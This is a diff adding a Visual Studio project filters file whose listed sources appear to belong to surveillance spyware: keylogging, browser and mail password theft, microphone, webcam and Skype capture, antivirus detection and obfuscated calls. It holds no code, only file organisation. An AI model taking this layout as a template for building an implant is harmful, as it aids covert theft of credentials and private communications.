@@ -1,0 +1,480 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{ebdad07f-1c66-437b-b72a-a26b3389a373}</UniqueIdentifier>
+      <Extensions>cpp;c;cxx;def;odl;idl;hpj;bat;asm</Extensions>
+    </Filter>
+    <Filter Include="Source Files\CRYPT">
+      <UniqueIdentifier>{aae82698-969b-4d8d-81ce-223fcb31fd17}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\IMAGENT">
+      <UniqueIdentifier>{f5b28a6d-3cf2-4953-89e1-fe0af4162809}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PREAMBLE">
+      <UniqueIdentifier>{4991dd47-fd64-4875-a30b-738aa8dffe94}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\MICAGENT">
+      <UniqueIdentifier>{33d4efc7-d5de-4ab4-8164-c17a9d01bca3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\PWDAGENT">
+      <UniqueIdentifier>{1d66e6d5-03aa-4ebf-b7af-c1b9898461ba}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\MAILAGENT">
+      <UniqueIdentifier>{b071ffe6-66f8-458e-a7a7-a2eff99ccdc0}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\CONTACTAGENT">
+      <UniqueIdentifier>{7c45d7f8-45e2-44ab-a7d0-595f57f09ad9}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\WEBCAMAGENT">
+      <UniqueIdentifier>{9d6367de-3c3e-442a-ab50-6ac51d02ad38}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\DYNAMICCALL">
+      <UniqueIdentifier>{01891adf-505b-4e1b-903a-8461b8cba156}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{f8e910d0-2b06-4377-af89-079551431827}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl;inc</Extensions>
+    </Filter>
+    <Filter Include="Header Files\Agents">
+      <UniqueIdentifier>{729ed73f-582d-4a74-9659-5c7b6f78136e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{e9da1f85-b787-4ce9-b411-8e55fc006dd1}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="AM_Core.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ASP.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="BitmapCommon.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="DeepFreeze.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="demo_functions.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="explore_directory.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="H4-DLL.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="LOG.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="SM_Core.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="status_log.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="UnHookClass.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="x64.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="aes_alg.cpp">
+      <Filter>Source Files\CRYPT</Filter>
+    </ClCompile>
+    <ClCompile Include="md5.cpp">
+      <Filter>Source Files\CRYPT</Filter>
+    </ClCompile>
+    <ClCompile Include="sha1.cpp">
+      <Filter>Source Files\CRYPT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QAgent.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QIcq.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QIcq7.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QList.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMessengerAgent.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMsn.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMsn6.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMsnLive.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMsnLive2009.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMsnLive85.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QOleWalker.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QProperty.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QYim.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QYim10.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QYim7.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QYim8.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QYim9.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_CodeAlign.cpp">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PreamblePatch.cpp">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_Reloc.cpp">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_SafeProcedures.cpp">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_MicAgent\QAmbientalMicrophone.cpp">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_MicAgent\QSpeechDetect.cpp">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_MicAgent\QVistaMicrophone.cpp">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_MicAgent\XpMic.cpp">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\base64.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\chrome.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\des.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\firefox.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\gtalk.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\iexplorer.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\msn.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\opera.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\outlook.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\paltalk.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\thunderbird.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_PWDAgent\trillian.cpp">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_MailAgent\OLMAPI.cpp">
+      <Filter>Source Files\MAILAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_MailAgent\WindowsMail.cpp">
+      <Filter>Source Files\MAILAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_ContactAgent\OLABMAPI.cpp">
+      <Filter>Source Files\CONTACTAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="wcam_grab.cpp">
+      <Filter>Source Files\WEBCAMAGENT</Filter>
+    </ClCompile>
+    <ClCompile Include="DynamiCall\dynamic_import.cpp">
+      <Filter>Source Files\DYNAMICCALL</Filter>
+    </ClCompile>
+    <ClCompile Include="HM_IMAgent\QMsnLive2011.cpp">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="H4-DLL.def">
+      <Filter>Source Files</Filter>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="procedures.asm">
+      <Filter>Source Files</Filter>
+    </MASM>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="aes_alg.h">
+      <Filter>Source Files\CRYPT</Filter>
+    </ClInclude>
+    <ClInclude Include="md5.h">
+      <Filter>Source Files\CRYPT</Filter>
+    </ClInclude>
+    <ClInclude Include="sha1.h">
+      <Filter>Source Files\CRYPT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QAgent.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QIcq.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QIcq7.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QList.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMessengerAgent.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMsn.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMsn6.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMsnLive.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMsnLive2009.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMsnLive85.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QOleWalker.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QProperty.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QYim.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QYim10.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QYim7.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QYim8.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QYim9.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_PreamblePatch.h">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_Reloc.h">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_SafeProcedures.h">
+      <Filter>Source Files\PREAMBLE</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MicAgent\QAmbientalMicrophone.h">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MicAgent\QSpeechDetect.h">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MicAgent\QVistaMicrophone.h">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MicAgent\XpMic.h">
+      <Filter>Source Files\MICAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_PWDAgent\base64.h">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_PWDAgent\des.h">
+      <Filter>Source Files\PWDAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MailAgent\MailAgent.h">
+      <Filter>Source Files\MAILAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_ContactAgent\OLABMAPI.h">
+      <Filter>Source Files\CONTACTAGENT</Filter>
+    </ClInclude>
+    <ClInclude Include="DynamiCall\dynamic_import.h">
+      <Filter>Source Files\DYNAMICCALL</Filter>
+    </ClInclude>
+    <ClInclude Include="DynamiCall\obfuscated_calls.h">
+      <Filter>Source Files\DYNAMICCALL</Filter>
+    </ClInclude>
+    <ClInclude Include="DynamiCall\prototypes.h">
+      <Filter>Source Files\DYNAMICCALL</Filter>
+    </ClInclude>
+    <ClInclude Include="AM_Core.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ASP.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="av_detect.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="bin_string.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="cert.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="common.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="DeepFreeze.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="demo_functions.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="exceptions.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="explore_directory.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="H4-DLL.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_BitmapCommon.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_CodeAlign.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_HooksSystemStruct.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_InbundleHook.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IpcModule.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_VistaSpecific.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="LOG.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="PEB.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="resource1.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="SM_ActionFunctions.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="SM_Core.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="SM_EventHandlers.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="status_log.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="UnHookClass.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="x64.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_AmbMic.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_Application.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_ClipBoard.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_Contacts.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_CrisisAgent.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_KeyLog.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_LogDevice.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MailCap.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_MouseLog.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_PDAAgent.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_PrintPool.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_ProcessMonitors.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_Pstorage.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_SkypeRecord.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_SnapShot.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_UrlLog.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_WebCam.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_WiFiLocation.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_IMAgent\QMsnLive2011.h">
+      <Filter>Source Files\IMAGENT</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="H4DLL1.rc">
+      <Filter>Resource Files</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+</Project>
